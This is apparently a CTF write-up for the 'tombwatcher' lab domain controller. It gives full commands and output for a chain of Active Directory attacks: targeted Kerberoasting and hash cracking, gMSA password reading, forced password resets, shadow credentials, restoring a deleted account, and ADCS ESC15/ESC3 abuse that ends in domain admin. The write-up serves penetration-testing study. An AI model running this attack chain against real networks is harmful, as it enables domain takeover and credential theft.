---
layout: post
title: "tombwatcher"
date: 2025-11-01 
categories: CTF
---
# tombwatcher

# Summary

- rusthound-ce to map out AD
- henry has WriteSPN on Alfred; perfrom targetedKerberoast to get TGS; crack TGS with hashcat to get password
- alfred has AddSelf privilege over Infrastructure group, which have readGMSA over ansible_dev$ machine account; bloodyAD to addself, nxc to read GMSA
- ansible_dev$ has ForceChangePassword on sam; bloodyAD to change password
- sam has WriteOwner over john; bloodyAD to add  ourself as owner of john; set GenericAll over john to get full control; either forceChangePassword or use ceritipy-ad shadow auto to get john’s NTLM hash
- john is part of Remote Management Users and has GenericAll over OU ADCS
- bloodhound saved query to find Enrollment rights on published certificate templates; reveal SID can enroll on WebServer; when SID do not map to a user on bloodhound, could mean user deleted
- evil-winrm as john; use Get-ADObject to find user with SID; user is cert_admin, deleted, but part of OU ADCS
- john has GenericAll over ADCS, use Restore-ADObject to re-enable account with GUID
- certipy-ad to find all vulnerable templates; certipy-ad to find vulnerable template where cert_admin has enrollment rights; template WebServer is vulnerable to ESC15
- Add Client Authentication EKU and administrator UPN in our requested certificate to impersonate; ldap-shell as administrator; add new user; add user to domain admin; we are domain admin
- Alternative way; certipy-ad to find all vulnerabilities in templates; template User vulnerable to ESC3
- Add Certificate Request Agent EKU to cert_admin certificate; request certificate on behalf of domain admin; get domain admin certificate; authenticate to get administrator NTLM; evil-winrm as domain admin

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/tombwatcher 10.10.11.72

53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-31 19:59:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-31T20:01:06+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-10-31T20:01:06+00:00; +4h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-31T20:01:06+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-31T20:01:06+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

From the output, we can tell the machine is a domain controller. Let’s add the hostname and domain name to our /etc/hosts file:

```bash
10.10.11.72 tombwatcher.htb DC01.tombwatcher.htb
```

We also got a domain account:

```bash
henry:H3nry_987TGV!
```

## SMB

Let’s enumerate the smb share:

```bash
nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares

SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

Let’s read NETLOGON, there might be some start up scripts:

```bash
nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --spider NETLOGON --regex .

SMB         10.10.11.72     445    DC01             //10.10.11.72/NETLOGON/. [dir]
SMB         10.10.11.72     445    DC01             //10.10.11.72/NETLOGON/.. [dir]
```

Nothing. 

## Bloodhound

Let’s map out the AD:

```bash
mkdir bh
bloodhound-python -u henry -p 'H3nry_987TGV!' -ns 10.10.11.72 -d tombwatcher.htb -c all
```

Now let’s start bloodhound and upload our data:

```bash
bloodhound
```

Searching up henry, we find:

![image.png]({{ site.baseurl }}/assets/tombwatcher/image.png)

We can perform a targeted Kerberoast attack, get Alfred’s TGS and crack their password with hashcat. 

```bash
python3 /home/kali/tools/targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --request-user alfred

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$6bdb0bb11b4089655c8eb0d5a8d9397f$2b31164241635016f0897c2414df79989ed541c8b800412372ac30873ced443d162f3f5cd2449ef32380f62bd04cef48f9d5430811cd17bcbab862cdd78c00f5376f667cb73c932d0bb1ef5288dd46e1bf967e04a2f23650eb75e8b7fe26734f8d80a0d00fe1f124f8c526e12f967da5101e5188ae32ef2040b388c2d1ae37d9b89b7b55c014ee40feb3b091e5331cb144b302d4a018cec2423e6df39cadd90239a7c78fe4615652ec53915cd0fd86f32fb8bb2655371af9403773dd9bbb9b9851294290a9883fe5bd4a0c296a332fb995ad059967db219f6048207e8958947bf9b5268cda63aff6584aa21da84149ade7c28dc0fee48a2bd1f03052ccd807b4f1570cd30b7641e509beaa1b48fb0d4e3d3472e7d503e073e45fdaf146404d0e16d177a8b5d213b32b99d914567588a1781a397c42e0806fd1186f95c734074fdfe1a29da956c3d3510936c58a6cbffb5990a4da6ae4a6ca6f0d4e0a62d4461dcae0436140a762b45a6665e0aa7522f9c6e74b5b70fea5781f8a0dcfa27d1ad611269b977aa80409e9224031a28f887767314a72fdd03553a0db6fb17989331ad480244781e0c9ba895cea17166a1225820573b8154488c3a69dd4b3243b466e9a82ea24e9a9f6fb2e4464d9be06360064fb0f56d6d80afb6b74e1d2c6ce79f119c847c8bfa5fc2457131f5ca18a9333c99b1f4bb18001d3715004f1cd77bbd8de24ed6526de6eb34f7c962cb4a8cf5ae628140f8e69bb99c08a423602e4f37dc7e0455e9c470cbb0d150e9cd4b9ea98ad7b82a15abbd866af04b86654333fd43c22822f84e1e1acb2e0190db5e92b1fef7f4b40d23173595e0ef15fdc522329fc6aff6136c6c0be68e6da40c6d358904e14e62a66be72bc50df4617fbe7e855fe46530ff86fb2c5403a2941df4b3273a9eed56bb42ca4a2fee9a96a45a3b6668500fac15ecb6966b354d8dee228111224b3d413666ad5d7ac7cb7ceeb644503d86ff18482c410fbe88a5aad6ed6b97f9e9136e015e1b3c95e465b1bb3ebacc1cd39662ae655cebcf6f81c382ffdf20c655469ceb27d6d80a741a32aa812b46eff3aaa07bd359524f6f6f2bf670af1ba0b04f7654ffaefa5c0ad634720df37d787617f30753316b5c555c1f601835576f6aebbec3a48f7d152dc2db4a04e08b567bcfbe14c507e1c31ee88aeb1638572a5d288f125457eb3d2c517f8193f52a4e2acff66ba3ea89beac8a9cc09bbbc7bad09aa2645c84316e4e7b8463e7ddc74c417d332c9f4e5555e7ecf3c4b250ccbba7d2d82d316e7e92b2b908df0bb0a50fac7f1287515c83fe0a5f22c78874ea2e899c4bb8736d2ff4f5797bd000d1b1c0fb346b367a459e60e9fa6a2c268a655465591add50290bad0cf717163eb37d92f8355aed560b0d6446da0e1946f0f286047205b9755872d3fda13d385a75facc8e598aab6f54a8e1d0acfee5ecae142a1a9e5e0c5
```

Now let’s crack it with hashcat:

```bash
.\hashcat.exe -m 13100 ..\hashes.txt ..\rockyou.txt

alfred:basketball
```

Let’s enumerate smb share:

```bash
nxc smb tombwatcher.htb -u alfred -p basketball --shares

SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share 
```

Nothing new. Let’s check bloodhound.

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%201.png)

We can add ourself to Infrastructure group.

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%202.png)

Which have read GMSAPassword rights over ansible_dev$ machine account; reveal machine password.

Let’s add ourself to Infrastructure with bloodyAD:

```bash
sudo ntpdate 10.10.11.72

bloodyAD -u alfred -p basketball -d tombwatcher.htb --host dc01.tombwatcher.htb add groupMember infrastructure alfred

[+] alfred added to infrastructure
```

Let’s read GMSA now:

```bash
nxc ldap tombwatcher.htb -u alfred -p basketball --gmsa

LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: bf8b11e301f7ba3fdc616e5d4fa01c30     PrincipalsAllowedToReadPassword: Infrastructure
```

We got the NTLM.

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%203.png)

We have ForceChangePassword on sam:

```bash
bloodyAD -u ansible_dev$ -p :bf8b11e301f7ba3fdc616e5d4fa01c30 -f rc4 -d tombwatcher.htb --host dc01.tombwatcher.htb set password sam 'Pass123!'

[+] Password changed successfully!
```

Let’s verify the change:

```bash
nxc smb tombwatcher.htb -u sam -p 'Pass123!' --shares

SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\sam:Pass123! 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%204.png)

We have WriteOwner privilege over john.

First, let’s set ourself as the owner of john:

```bash
bloodyAD -u sam -p 'Pass123!' -d tombwatcher.htb --host dc01.tombwatcher.htb set owner john sam

[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

Now give ourself full control:

```bash
bloodyAD -u sam -p 'Pass123!' -d tombwatcher.htb --host dc01.tombwatcher.htb add genericAll john sam

[+] sam has now GenericAll on john
```

Now we can change john’s password 

```bash
bloodyAD -u sam -p 'Pass123!' -d tombwatcher.htb --host dc01.tombwatcher.htb set password john 'Pass123!'

[+] Password changed successfully!

```

Let’s verify:

```bash
nxc smb tombwatcher.htb -u john -p 'Pass123!' --shares

SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\john:Pass123!
```

In a real pentest, to avoid changing password so much, we can use certipy shadow auto method to get john’s NTLM hash instead:

```bash
certipy-ad shadow auto -u sam@tombwatcher.htb -p 'Pass123!' -account john -dc-ip 10.10.11.72

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0e7031d8aecb40d8b014bba50673a23a'
[*] Adding Key Credential with device ID '0e7031d8aecb40d8b014bba50673a23a' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '0e7031d8aecb40d8b014bba50673a23a' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': c718f548c75062ada93250db208d3178
```

Let’s check out john’s privileges:

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%205.png)

We are part of the remote management users; grants us access via winrm.

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%206.png)

We also have GenericAll over the organisational unit ADCS. 

However, when we click on ADCS, we see that no users/computers/groups are in the OU.

## Privilege Escalation

Let’s logon via evil-winrm:

```bash
evil-winrm -i tombwatcher.htb -u john -H c718f548c75062ada93250db208d3178
```

Start basic enumeration:

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%207.png)

Let’s check powershell history:

```bash
type C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

None. 

No saved DPAPI blobs either. 

Nothing in web root.

Let’s find unattend.xml. It’s in C:\Windows\panther

```bash
    <UserAccounts>        
     <LocalAccounts>                                                                                                                           
      <LocalAccount wcm:action="add">                                                                                                                 <Password>*SENSITIVE*DATA*DELETED*</Password>                                                                                                  <Group>administrators;users</Group>                                                                                                            <Name>administrator</Name>                                                                                                              
      </LocalAccount>
     </LocalAccounts>                                                  
    </UserAccounts>

```

No passwords.

Let’s transfer winpeas and execute it.

Upload failed.

Let’s find out whether there are any subdomains:

```bash
nxc ldap dc01.tombwatcher.htb -u john -H c718f548c75062ada93250db208d3178 -M get-network -o ALL=true

dc01.tombwatcher.htb     10.10.11.72
```

We can use rusthound-ce to map out the AD again, this time, we can get certificate infomration:

```bash
rusthound-ce -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -z
```

Now upload it again on bloodhound. Now we go to Enrollment rights on published certificate templates, we get this:

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%208.png)

One interesting thing was:

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%209.png)

The SID usually mean the user is deleted, so bloodhound couldn’t map this. 

We could’ve also found this from certipy:

```bash
certipy-ad find -u john -hashes :c718f548c75062ada93250db208d3178 -target 10.10.11.72

cat 20251031140312_Certipy.txt

```

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%2010.png)

Under enrollment rights, we find the same SID

To find out what user mapped to that SID, we go back to our winrm session.

```bash
Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties * -IncludeDeletedObjects
```

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%2011.png)

The user is cert_admin and they are part of the ADCS OU. Since john has GenericAll over ADCS, we can re-enable the user and abuse the enrollment rights after. 

On our winrm session, we can restore the account using their GUID. We can find the GUID of cert_admin from our previous command:

```bash
Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties * -IncludeDeletedObjects

Deleted                         : True
<SNIP>
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

To restore:

```bash
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"

#verify
Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties *

isDeleted                       :   
```

Now the isDeleted is blank. Let’s user cert_admin to search for certificate vulnerabilities. First, let’s get their NT hash using the shadow auto method:

```bash
certipy-ad shadow auto -u john@tombwatcher.htb -hashes :c718f548c75062ada93250db208d3178 -account cert_admin -dc-ip 10.10.11.72

#if error clock skew error keep persisting, just keep executing ntpdate until we get the NT hash

[*] Targeting user 'cert_admin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4223869ff61e4984ba8d86db6143bf1f'
[*] Adding Key Credential with device ID '4223869ff61e4984ba8d86db6143bf1f' to the Key Credentials for 'cert_admin'
[*] Successfully added Key Credential with device ID '4223869ff61e4984ba8d86db6143bf1f' to the Key Credentials for 'cert_admin'
[*] Authenticating as 'cert_admin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'cert_admin@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'cert_admin.ccache'
[*] Wrote credential cache to 'cert_admin.ccache'
[*] Trying to retrieve NT hash for 'cert_admin'
[*] Restoring the old Key Credentials for 'cert_admin'
[*] Successfully restored the old Key Credentials for 'cert_admin'
[*] NT hash for 'cert_admin': f87ebf0febd9c4095c68a88928755773
```

Now we can search for vulnerable templates:

```bash
certipy-ad find -u cert_admin -hashes f87ebf0febd9c4095c68a88928755773 -dc-ip 10.10.11.72 -stdout -vuln

[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

```

There is a ESC15 vulnerability. 

Searching up esc15, we find this post:

[https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/](https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/)

[https://github.com/rayngnpc/CVE-2024-49019-rayng](https://github.com/rayngnpc/CVE-2024-49019-rayng)

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%2012.png)

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%2013.png)

Let’s request the certificate and add a EKU:

```bash
certipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -u cert_admin -hashes f87ebf0febd9c4095c68a88928755773 -template WebServer -upn Administrator@tombwatcher.htb -application-policies 'Client Authentication'

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%2014.png)

Now we can get a LDAP-shell, add a new user in Domain Admins:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
```

![image.png]({{ site.baseurl }}/assets/tombwatcher/image%2015.png)

```bash
add_user badadmin

Attempting to create user in: %s CN=Users,DC=tombwatcher,DC=htb
Adding new user with username: badadmin and password: mb[X+F+s<Cz.T}c result: OK

add_user_to_group badadmin "Domain Admins"

Adding user: badadmin to group Domain Admins result: OK
```

Now let’s check our user:

```bash
nxc smb dc01.tombwatcher.htb -u badadmin -p 'mb[X+F+s<Cz.T}c' --shares

SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\badadmin:mb[X+F+s<Cz.T}c (Pwn3d!)
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.11.72     445    DC01             C$              READ,WRITE      Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ,WRITE      Logon server share 
```

We are now domain admin. 

```bash
evil-winrm -i 10.10.11.72 -u badadmin -p 'mb[X+F+s<Cz.T}c'
```

There is also another method that leverages the ESC3 vulnerability. This time, we request a different application-plicies; Certificate Request Agent:

```bash
certipy-ad req -u cert_admin@tombwatcher.htb -hashes f87ebf0febd9c4095c68a88928755773 -application-policies "Certificate Request Agent" -ca tombwatcher-CA-1 -template WebServer -dc-ip 10.10.11.72

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'

```

Now we use a difference certificate that is vulnerable to ESC3. We check the vulnerability from the vulnerability can we did earlier:

```bash
cat 20251031140312_Certipy.txt

    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.

```

The User template is vulnerable to ESC3. 

A **certificate acting as an Enrollment Agent can be used to submit certificate requests on behalf of other principals** if the CA/template accepts RA-signed requests (or if the template has ESC3-style weaknesses). That means you don’t have to be explicitly listed in the *template’s Enrollment Rights* ACL to cause the CA to issue a cert for a different subject — the CA may trust the Enrollment Agent cert itself to authorize those requests.

Now request certificate for domain admin using cert_admin’s certificate:

```bash
certipy-ad req -u cert_admin@tombwatcher.htb -hashes f87ebf0febd9c4095c68a88928755773 -on-behalf-of 'tombwatcher\administrator' -template USER -ca tombwatcher-CA-1 -pfx cert_admin.pfx -dc-ip 10.10.11.72

[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Now let’s get their NTLM hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc

```

Now we can winrm onto the machine as Administrator:

```bash
evil-winrm -i 10.10.11.72 -u administrator -H f61db423bebe3328d33af26741afe5fc
```